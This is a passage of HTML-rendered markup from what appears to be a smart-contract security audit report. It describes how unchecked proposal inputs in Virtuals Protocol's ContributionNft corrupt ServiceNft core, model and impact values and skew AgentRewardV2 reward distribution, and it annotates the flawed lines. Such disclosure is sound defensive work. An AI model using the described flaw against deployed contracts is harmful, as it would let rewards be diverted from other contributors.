);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot be parent of itself\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAn issue arises here when these proposers are able to pass in incorrect/bogus values of incorrect \u003ccode\u003ecoreId\u003c/code\u003e, \u003ccode\u003enewTokenURI\u003c/code\u003e, \u003ccode\u003eparentId\u003c/code\u003e, \u003ccode\u003eisModel_\u003c/code\u003e and \u003ccode\u003edatasetId\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIncorrect cores and model values inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58C14-L58C18\"\u003e\u003ccode\u003eServiceNft::mint\u003c/code\u003e\u003c/a\u003e function, leading to incorrect \u003ccode\u003eserviceNFT\u003c/code\u003e mint:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etba\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect core set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate maturity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);               \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect model\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eCoreServiceUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_coreServices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_coreDatasets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_cores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eIncorrect \u003ccode\u003edatasetId\u003c/code\u003e would overwrite someone else’s values as well as incorrect \u003ccode\u003e_impacts\u003c/code\u003e calculated for both \u003ccode\u003eproposalId\u003c/code\u003e and \u003ccode\u003edatasetId\u003c/code\u003e can be seen inside the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect datasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetImpactWeight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;                \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect impact calculated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];                         \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect impact calculated\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSetServiceScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis clearly breaks three functionalities:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252\"\u003e\u003ccode\u003eAgentRewardV2::_distributeContributorRewards\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_distributeContributorRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        RewardSettingsCheckpoints.RewardSettings \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esettings\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eservices\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eimpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNftContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetImpact\u003c/span\u003e\u003cspan 